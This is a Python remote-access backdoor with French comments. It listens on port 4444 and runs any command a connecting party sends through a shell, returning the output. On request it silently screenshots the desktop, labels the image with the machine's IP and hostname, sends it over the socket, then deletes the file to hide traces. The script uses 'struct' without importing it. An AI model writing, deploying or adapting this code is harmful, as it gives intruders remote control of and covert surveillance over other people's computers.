import socket
import subprocess as sp
import asyncio
import pyautogui
import os
import time

host = "0.0.0.0"
port = 4444

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind((host, port))
s.listen(5)
print(f"[*] En attente de connexion sur {host}:{port}")

async def execute_command(command):
    process = sp.Popen(command, shell=True, stdout=sp.PIPE, stderr=sp.PIPE, stdin=sp.PIPE, text=True)
    out, err = process.communicate()
    return out + err

def take_screenshot():
    """Prend un screenshot avec un nom unique et le supprime après envoi."""
    ip = socket.gethostbyname(socket.gethostname())
    hostname = socket.gethostname()
    timestamp = time.strftime("%Y%m%d-%H%M%S", time.localtime()) + f"-{int(time.time() * 1000) % 1000}"
    
    filename = f"{ip}_{hostname}_{timestamp}.png"
    screenshot_path = os.path.join("C:/Users/Public/Downloads", filename)
    
    screenshot = pyautogui.screenshot()
    screenshot.save(screenshot_path)
    
    return screenshot_path, filename

async def handle_client(conn):
    while True:
        try:
            command = conn.recv(1024).decode()
            if not command:
                break

            if command == "SCREENSHOT":
                screenshot_path, filename = take_screenshot()
                
                with open(screenshot_path, "rb") as file:
                    data = file.read()
                
                file_size = len(data)
                conn.sendall(struct.pack("!I", file_size))  # Envoyer la taille du fichier
                conn.sendall(filename.encode().ljust(100))  # Envoyer le nom du fichier (100 octets)
                conn.sendall(data)  # Envoyer l'image

                os.remove(screenshot_path)  # Suppression définitive du fichier après envoi
            else:
                result = await execute_command(command)
                conn.send(result.encode() if result else b"Commande executee sans resultat.\n")

        except ConnectionResetError:
            break

    print(f"[-] Connexion fermée par le serveur.")
    conn.close()

async def main():
    while True:
        conn, addr = s.accept()
        print(f"[+] Connexion établie avec {addr[0]}")
        await handle_client(conn)

asyncio.run(main())